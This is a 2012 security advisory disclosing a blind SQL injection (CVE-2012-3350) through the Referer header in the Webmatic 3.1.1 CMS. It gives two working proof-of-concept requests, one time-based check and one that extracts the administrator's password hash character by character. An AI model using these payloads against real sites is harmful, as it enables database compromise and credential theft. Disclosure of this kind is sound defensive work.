Advisory ID: HTB23096
Product: Webmatic
Vendor: valarsoft.com
Vulnerable Version(s): 3.1.1 and probably prior
Tested Version: 3.1.1
Vendor Notification: 13 June 2012
Public Disclosure: 4 July 2012
Vulnerability Type: Blind SQL Injection
CVE Reference: CVE-2012-3350
CVSSv2 Base Score: 7.5 (AV:N/AC:L/Au:N/C:P/I:P/A:P)
Risk Level: High
Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ )

-----------------------------------------------------------------------------------------------

Advisory Details:

High-Tech Bridge SA Security Research Lab has discovered vulnerability in Webmatic, which can be exploited to perform Blind SQL Injection attacks.


1) Blind SQL Injection in Webmatic: CVE-2012-3350

1.1 Input passed via the "Referer:" field of the HTTP header to index.php is not properly sanitised before being used in SQL query resulting in SQL injection. However the SQL injection is blind and shall be exploited by a time-based technique, or any other, suitable for blind SQL injection exploitation.

The following PoC (Proof of Concept) verifies presence of the vulnerability, if SQL injection exists - web application response time will be longer than with a normal HTTP request:


GET / HTTP/1.1
Referer: 1', IF((1=1),sleep(100),''), '', '0', '0', '0') -- 2


In the second PoC application response will be longer if the vulnerability is present and if the first character of administrator's hash is equal to 'a':


GET / HTTP/1.1
Referer: 1', IF(((SELECT mid(password,1,1) FROM `_users` WHERE userID=1)='a'),sleep(100),''), '', '0', '0', '0') -- 2


Successful exploitation of the vulnerability requires that "magic_quotes_gpc" is set to off.

-----------------------------------------------------------------------------------------------

Solution:

Currently we are not aware of any vendor-supplied patches or other solutions.
As a temporary solution edit the application source code to ensure that input is properly sanitised.

-----------------------------------------------------------------------------------------------

References:

[1] High-Tech Bridge Advisory HTB23096 - https://www.htbridge.com/advisory/HTB23096 - Blind SQL Injection in Webmatic.
[2] Webmatic - http://www.valarsoft.com - Webmatic its a free GNU/GPL php5 script that help you to create a complex website. With the webmatic control panel its possible to manage all the contents of a whole website, its possible to create: forums, chat, newsletter, online surveys, users registration page and more.
[3] Common Vulnerabilities and Exposures (CVE) - http://cve.mitre.org/ - international in scope and free for public use, CVEÂ® is a dictionary of publicly known information security vulnerabilities and exposures.

-----------------------------------------------------------------------------------------------

Disclaimer: The information provided in this Advisory is provided "as is" and without any warranty of any kind. Details of this Advisory may be updated in order to provide as accurate information as possible. The latest version of the Advisory is available on web page [1] in the References.